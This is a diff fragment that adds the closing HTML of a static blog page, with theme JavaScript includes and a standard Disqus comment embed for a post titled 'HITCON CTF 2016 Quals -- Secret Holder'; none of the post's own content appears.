+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.1"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://bruce30262logdown.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'https://bruce30262.github.io/2016/10/10/2016-10-10-hitcon-ctf-2016-quals-secret-holder/';
+          this.page.identifier = '2016/10/10/2016-10-10-hitcon-ctf-2016-quals-secret-holder/';
+          this.page.title = 'HITCON CTF 2016 Quals -- Secret Holder';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://bruce30262logdown.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
